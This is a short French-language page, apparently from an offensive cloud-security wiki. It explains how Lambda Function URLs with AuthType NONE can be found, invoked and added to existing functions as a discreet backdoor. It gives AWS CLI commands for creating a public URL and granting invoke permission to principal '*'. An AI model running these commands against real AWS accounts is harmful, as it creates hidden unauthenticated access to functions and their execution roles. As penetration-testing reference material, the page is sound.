---
title: "URL de fonction : invoquer une Lambda directement via HTTPS"
order: 4
description: "Détourner une URL de fonction Lambda dont l'authentification est laxiste pour invoquer la fonction directement via HTTPS."
keywords:
  - URL de fonction
  - Lambda
  - AuthType NONE
  - HTTPS
  - invocation
---

# URL de fonction

Une **URL de fonction (Function URL)** Lambda est un point de terminaison HTTPS dédié associé à une fonction. Son `AuthType` vaut soit `AWS_IAM`, soit `NONE` ; une URL réglée sur `NONE` peut être invoquée par n'importe qui sur Internet sans aucun identifiant, ce qui expose directement la fonction (et tout ce qu'elle fait sous son [rôle d'exécution](execution-role.md)). Avec `lambda:CreateFunctionUrlConfig`, un attaquant peut aussi ajouter une URL `NONE` à une fonction existante comme backdoor discrète.

## Trouver et invoquer une URL ouverte

```bash
aws lambda list-function-url-configs --function-name <fn> \
  --query 'FunctionUrlConfigs[].[FunctionUrl,AuthType]'
curl -s "https://<url-id>.lambda-url.<region>.on.aws/" -d '{"k":"v"}'
```

## Ajouter une URL comme backdoor

```bash
aws lambda create-function-url-config --function-name <fn> --auth-type NONE
aws lambda add-permission --function-name <fn> --action lambda:InvokeFunctionUrl \
  --principal '*' --function-url-auth-type NONE --statement-id open
```

## Notes d'exploitation

- `AuthType NONE` associé à une permission `InvokeFunctionUrl` avec `Principal: *` rend la fonction entièrement publique ; les deux sont nécessaires et ce sont deux modifications de configuration discrètes.
- Une fonction existante dotée d'une logique sensible ou d'un rôle d'exécution puissant devient directement accessible dès qu'une URL `NONE` lui est attachée.
- Les URL de fonction n'apparaissent pas dans les listages d'API Gateway, ce qui les rend faciles à manquer lors d'un inventaire des points d'entrée exposés.

## Outils

- **AWS CLI** (`lambda list-function-url-configs`, `create-function-url-config`, `add-permission`).
- **curl** / **Burp Suite** : invocation et fuzzing du point de terminaison.

## Références

- [AWS : URL de fonction Lambda](https://docs.aws.amazon.com/lambda/latest/dg/lambda-urls.html)
- [HackTricks Cloud : AWS Lambda](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
- [Rhino Security Labs : élévation de privilèges AWS](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [Stratus Red Team : techniques AWS](https://stratus-red-team.cloud/attack-techniques/AWS/)
